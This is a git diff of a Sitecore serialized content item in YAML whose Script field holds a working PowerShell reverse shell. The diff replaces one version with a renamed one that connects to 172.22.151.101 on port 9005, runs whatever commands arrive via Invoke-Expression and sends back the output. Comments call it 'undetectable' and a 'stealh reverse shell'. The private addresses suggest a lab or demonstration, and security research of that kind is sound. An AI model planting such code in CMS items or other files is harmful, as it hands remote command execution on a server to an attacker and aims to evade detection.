@@ -7,20 +7,25 @@ SharedFields:
 - ID: "b1a94ff0-6897-47c0-9c51-aa6acb80b1f0"
   Hint: Script
   Value: |
-    $reverseShell = New-Object System.Net.Sockets.TCPClient("172.22.150.124", 9003);
-    $stream = $reverseShell.GetStream();
-    # Make this shell undetectable
-    [byte[]]$bytes = 0..65535|%{0};
-    while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
+    
+    $reverseShellClient = New-Object System.Net.Sockets.TCPClient('172.22.151.101', 9005);
+    $reverseShellStream = $reverseShellClient.GetStream();
+    # Generate a stealh reverse shell
+    [byte[]]$reverseShellBytes = 0..65535|%{0};
+    while(($i = $reverseShellStream.Read($reverseShellBytes, 0, $reverseShellBytes.Length)) -ne 0)
     {
-        $data = (New-Object -TypeName System.Text.UTF8Encoding).GetString($bytes,0, $i);
-        $sendback = (iex $data 2>&1 | Out-String );
-        $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
-        $sendbyte = ([text.encoding]::UTF8).GetBytes($sendback2);
-        $stream.Write($sendbyte,0,$sendbyte.Length);
-        $stream.Flush();
+        $reverseShellCommand = (New-Object -TypeName System.Text.UTF8Encoding).GetString($reverseShellBytes,0, $i);
+        $reverseShellOutput = (Invoke-Expression -Command $reverseShellCommand 2>&1 | Out-String );
+        $reverseShellOutput2  = $reverseShellOutput + 'PS ' + (Get-Location).Path + '> ';
+        $reverseShellOutputBytes = ([text.encoding]::UTF8).GetBytes($reverseShellOutput2);
+        $reverseShellStream.Write($reverseShellOutputBytes,0,$reverseShellOutputBytes.Length);
+        $reverseShellStream.Flush();
     }
-    $reverseShell.Close();
+    $reverseShellClient.Close();
+    
+    
+    
+    
     
 Languages:
 - Language: en
@@ -40,11 +45,11 @@ Languages:
         sitecore\bas.lijten@gmail.com
     - ID: "8cdc337e-a112-42fb-bbb4-4143751e123f"
       Hint: __Revision
-      Value: "ec713fb0-930a-4779-93b1-1112cad66c8f"
+      Value: "3172ff28-4558-4de9-8ab9-fdcb5bee1dad"
     - ID: "badd9cf9-53e0-4d0c-bcc0-2d784c282f6a"
       Hint: __Updated by
       Value: |
         sitecore\bas.lijten@gmail.com
     - ID: "d9cf14b1-fa16-4ba6-9288-e8a174d4d522"
       Hint: __Updated
-      Value: 20230621T212558Z
+      Value: 20230622T184928Z
